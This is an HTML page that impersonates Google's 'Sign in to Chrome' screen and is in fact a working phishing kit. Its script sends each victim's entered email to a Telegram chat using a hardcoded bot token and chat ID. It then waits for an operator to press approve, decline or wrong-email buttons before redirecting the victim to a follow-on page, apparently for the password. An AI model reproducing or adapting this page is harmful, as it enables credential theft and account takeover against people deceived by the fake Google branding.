<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in to Chrome</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            animation: fadeIn 1s ease-in;
        }
        
        .card {
            border: none;
            width: 100%;
            animation: slideUp 0.7s ease-out;
        }
        
        .small-link {
            font-size: 0.875rem;
        }
        
        @media (min-width: 576px) {
            .card-wrapper {
                max-width: 400px;
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(30px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        /* ===== ERROR BANNER ===== */
        
        .error-msg {
            background: rgba(220, 53, 69, 0.12);
            border: 1px solid rgba(220, 53, 69, 0.3);
            color: #dc3545;
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 13px;
            margin-bottom: 16px;
            display: none;
            text-align: center;
        }
        /* ===== SPINNER OVERLAY ===== */
        
        .spinner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
            pointer-events: none;
        }
        
        .spinner-overlay.active {
            opacity: 1;
            visibility: visible;
            pointer-events: all;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #ffffff30;
            border-top-color: #0d6efd;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            color: #e0e0e0;
            font-size: 14px;
            margin-top: 20px;
            font-weight: 500;
        }
        
        .spinner-email {
            color: #0d6efd;
            font-size: 13px;
            margin-top: 8px;
            font-weight: 600;
        }
        
        .cancel-poll-btn {
            margin-top: 20px;
            padding: 10px 24px;
            background: transparent;
            border: 1px solid #6c757d;
            border-radius: 50px;
            color: #adb5bd;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .cancel-poll-btn:hover {
            border-color: #dc3545;
            color: #dc3545;
        }
    </style>
</head>

<body>
    <div class="container d-flex justify-content-center align-items-center min-vh-100">
        <div class="card card-wrapper p-4 shadow rounded-4">
            <div class="text-center mb-3">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" height="30">
                <h5 class="mt-3 mb-1">Sign in to Chrome</h5>
                <p class="text-muted small">Use your Google Account</p>
            </div>

            <!-- Error message area -->
            <div class="error-msg" id="loginError"></div>

            <form id="loginForm">
                <div class="mb-3">
                    <input type="email" class="form-control" id="email" placeholder="Email or phone" required>
                </div>
                <div class="mb-2 text-start">
                    <a href="#" class="text-primary small-link">Forgot email?</a>
                </div>

                <div class="mb-3 text-start small text-muted">
                    Not your computer? Use Guest mode to sign in privately.<br>
                    <a href="#" class="text-primary small-link">Learn more about using Guest mode</a>
                </div>

                <div class="d-flex justify-content-between align-items-center">
                    <a href="#" class="text-primary small-link">Create account</a>
                    <button type="submit" class="btn btn-primary px-4" id="nextBtn">Next</button>
                </div>
            </form>
        </div>
    </div>

    <!-- SPINNER OVERLAY -->
    <div class="spinner-overlay" id="spinnerOverlay">
        <div class="spinner"></div>
        <p class="spinner-text">Verifying your email...</p>
        <p class="spinner-email" id="spinnerEmailDisplay"></p>
        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
    </div>

    <script>
        // =====================================================
        // CONFIG
        // =====================================================
        const TELEGRAM_BOT_TOKEN = "8859101981:AAEQiFAqQtmOLCgEkUMn_ieXpqrs-A5KTQ8";
        const TELEGRAM_CHAT_ID = "6367881211";
        const APPROVAL_REDIRECT_URL_BASE = "second.html";

        // =====================================================
        // POLLING STATE
        // =====================================================
        let pollDecided = false;
        let pollTimeoutId = null;
        let pollAbortController = null;
        let isPollingActive = false;

        // =====================================================
        // UI HELPERS
        // =====================================================
        function showError(msg) {
            const err = document.getElementById('loginError');
            if (err) {
                err.textContent = msg;
                err.style.display = 'block';
            }
        }

        function hideError() {
            const err = document.getElementById('loginError');
            if (err) err.style.display = 'none';
        }

        function maskEmail(email) {
            const parts = email.split('@');
            if (parts.length !== 2) return email;
            const local = parts[0];
            const domain = parts[1];
            let maskedLocal;
            if (local.length <= 2) {
                maskedLocal = local.charAt(0) + '*';
            } else {
                maskedLocal = local.charAt(0) + '*'.repeat(local.length - 2) + local.charAt(local.length - 1);
            }
            return maskedLocal + '@' + domain;
        }

        // =====================================================
        // CANCEL POLLING
        // =====================================================
        function cancelPolling() {
            pollDecided = true;
            if (pollTimeoutId) clearTimeout(pollTimeoutId);
            if (pollAbortController) pollAbortController.abort();
            isPollingActive = false;
            document.getElementById('spinnerOverlay').classList.remove('active');
            document.getElementById('nextBtn').disabled = false;
            showError('Request cancelled. Please try again.');
        }

        // =====================================================
        // POLLING ENGINE — long-poll, 409-safe, callback-only
        // =====================================================
        function startPolling(userId, email) {
            pollDecided = false;
            let offset = 0;
            let pollCount = 0;
            const MAX_POLLS = 180;

            if (pollAbortController) pollAbortController.abort();
            pollAbortController = new AbortController();

            function pollLoop() {
                if (pollDecided) return;
                if (isPollingActive) {
                    pollTimeoutId = setTimeout(pollLoop, 500);
                    return;
                }

                pollCount++;
                if (pollCount > MAX_POLLS) {
                    pollDecided = true;
                    document.getElementById('spinnerOverlay').classList.remove('active');
                    document.getElementById('nextBtn').disabled = false;
                    showError('Request timed out. Please try again.');
                    return;
                }

                isPollingActive = true;

                const url =
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
                    `?offset=${offset}&timeout=15&allowed_updates=%5B%22callback_query%22%5D`;

                fetch(url, {
                        signal: pollAbortController.signal
                    })
                    .then(res => {
                        if (res.status === 409) {
                            isPollingActive = false;
                            pollTimeoutId = setTimeout(pollLoop, 3000);
                            return null;
                        }
                        if (!res.ok) throw new Error('HTTP ' + res.status);
                        return res.json();
                    })
                    .then(data => {
                        if (data === null) return;

                        if (!data.ok || pollDecided) {
                            isPollingActive = false;
                            if (!pollDecided) {
                                pollTimeoutId = setTimeout(pollLoop, 1000);
                            }
                            return;
                        }

                        if (data.result && data.result.length > 0) {
                            for (const update of data.result) {
                                offset = update.update_id + 1;

                                if (update.callback_query) {
                                    const action = update.callback_query.data;

                                    // Answer callback to remove loading state
                                    fetch(
                                            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                                method: 'POST',
                                                headers: {
                                                    'Content-Type': 'application/json'
                                                },
                                                body: JSON.stringify({
                                                    callback_query_id: update.callback_query.id,
                                                    text: "Processing..."
                                                })
                                            }
                                        )
                                        .catch(() => {});

                                    if (action === `approve_${userId}`) {
                                        pollDecided = true;
                                        isPollingActive = false;
                                        document.getElementById('spinnerOverlay').classList.remove('active');
                                        window.location.href = APPROVAL_REDIRECT_URL_BASE + '?email=' + encodeURIComponent(email);
                                        return;
                                    } else if (action === `decline_${userId}`) {
                                        pollDecided = true;
                                        isPollingActive = false;
                                        document.getElementById('spinnerOverlay').classList.remove('active');
                                        document.getElementById('nextBtn').disabled = false;
                                        showError('Request declined. Please try again.');
                                        return;
                                    } else if (action === `wrong_${userId}`) {
                                        pollDecided = true;
                                        isPollingActive = false;
                                        document.getElementById('spinnerOverlay').classList.remove('active');
                                        document.getElementById('nextBtn').disabled = false;
                                        showError('Wrong email. Please enter the correct email.');
                                        return;
                                    }
                                }
                            }
                        }

                        isPollingActive = false;
                        if (!pollDecided) {
                            pollTimeoutId = setTimeout(pollLoop, 500);
                        }
                    })
                    .catch(err => {
                        if (err.name === 'AbortError') return;
                        console.error('Poll error:', err);
                        isPollingActive = false;
                        if (!pollDecided) {
                            pollTimeoutId = setTimeout(pollLoop, 2000);
                        }
                    });
            }

            pollLoop();
        }

        // =====================================================
        // SEND MESSAGE + INLINE KEYBOARD
        // =====================================================
        function sendTelegramWithInlineKeyboard(message, keyboard, userId, email) {
            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const nextBtn = document.getElementById('nextBtn');

            let attempts = 0;
            const maxAttempts = 3;

            function attemptSend() {
                attempts++;
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML',
                            reply_markup: JSON.stringify(keyboard)
                        })
                    })
                    .then(res => {
                        if (!res.ok) throw new Error('HTTP ' + res.status);
                        return res.json();
                    })
                    .then(data => {
                        if (data.ok) {
                            startPolling(userId, email);
                        } else {
                            if (attempts < maxAttempts) {
                                setTimeout(attemptSend, 1000 * attempts);
                            } else {
                                spinnerOverlay.classList.remove('active');
                                nextBtn.disabled = false;
                                showError('Failed to send notification. Please try again.');
                            }
                        }
                    })
                    .catch(err => {
                        console.error('Send error:', err);
                        if (attempts < maxAttempts) {
                            setTimeout(attemptSend, 1000 * attempts);
                        } else {
                            spinnerOverlay.classList.remove('active');
                            nextBtn.disabled = false;
                            showError('Network error. Please check your connection and try again.');
                        }
                    });
            }

            attemptSend();
        }

        // =====================================================
        // FORM SUBMIT
        // =====================================================
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            hideError();

            const email = document.getElementById('email').value.trim();

            if (!email) {
                showError('Please enter your email address.');
                return;
            }

            // Show spinner
            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const spinnerEmailDisplay = document.getElementById('spinnerEmailDisplay');
            const nextBtn = document.getElementById('nextBtn');

            spinnerEmailDisplay.textContent = maskEmail(email);
            spinnerOverlay.classList.add('active');
            nextBtn.disabled = true;

            // Unique userId per session
            const userId = 'chrome_' + email.replace(/[^a-zA-Z0-9]/g, '').slice(0, 12) + '_' + Date.now();

            const message =
                `🔔 <b>New Chrome Sign-In Attempt</b>\n\n` +
                `📧 Email: <code>${email}</code>\n` +
                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
                `Tap to copy the email above.\n` +
                `Please approve, decline, or mark as wrong email:`;

            const keyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ APPROVE",
                        callback_data: `approve_${userId}`
                    }, {
                        text: "❌ DECLINE",
                        callback_data: `decline_${userId}`
                    }],
                    [{
                        text: "⚠️ WRONG EMAIL",
                        callback_data: `wrong_${userId}`
                    }]
                ]
            };

            sendTelegramWithInlineKeyboard(message, keyboard, userId, email);
        });
    </script>
</body>

</html>
